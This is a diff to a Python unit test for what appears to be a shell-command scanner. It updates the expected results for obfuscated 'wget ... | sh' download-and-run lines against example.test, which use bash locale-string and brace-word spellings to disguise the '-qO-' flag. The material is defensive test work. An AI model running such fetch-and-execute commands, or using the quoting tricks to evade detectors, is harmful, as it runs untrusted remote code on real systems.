@@ -1663,9 +1663,10 @@ class TestWhatStays(unittest.TestCase):
         # #3042's reading of a fetcher's words in two spellings the reader hands on otherwise: a locale string
         # (`$""`, `$"-qO-"`) reaches the readers as `$` and its text, and a brace word is never read so. Open on `main`
         # too. Truth: runs under bash, all eight; dash reads the word as written and fetches only.
-        for text in ('wget $""-qO- https://example.test/i.sh | sh\n', 'wget $"-qO-" https://example.test/i.sh | sh\n', 'wget {,}-qO- https://example.test/i.sh | sh\n'):
-            with self.subTest(text=text):
-                self.assertEqual(CLEAN, marks(text))
+        for text in ('wget $""-qO- https://example.test/i.sh | sh\n', 'wget $"-qO-" https://example.test/i.sh | sh\n'):
+            with self.subTest(text=text):     # (moved by #3048: the locale string read as bash reads it)
+                self.assertEqual(BOTH, marks(text))
+        self.assertEqual(CLEAN, marks('wget {,}-qO- https://example.test/i.sh | sh\n'))
 
     def test_a_cluster_written_after_such_a_word(self):
         # ... and where a cluster is written after a word read so, `main` reads that one, and the rule reads the
